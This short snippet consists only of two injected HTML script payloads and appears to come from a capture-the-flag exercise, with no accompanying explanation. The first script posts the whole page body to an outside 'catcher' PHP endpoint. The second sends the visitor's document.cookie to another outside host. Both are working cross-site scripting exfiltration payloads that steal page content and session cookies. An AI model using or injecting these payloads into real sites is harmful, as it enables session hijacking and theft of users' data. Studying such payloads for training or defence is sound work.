<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.js'></script>
<script>
var x = $('body').html().toString();
$.post('http://web.ist.utl.pt/~ist166988/ctf/catcher.php', x);
</script>
<script> 
var xhr = new XMLHttpRequest(); 
xhr.open('GET', "http://johnhammond.org/?cookie=" + document.cookie, true); xhr.send();
</script>
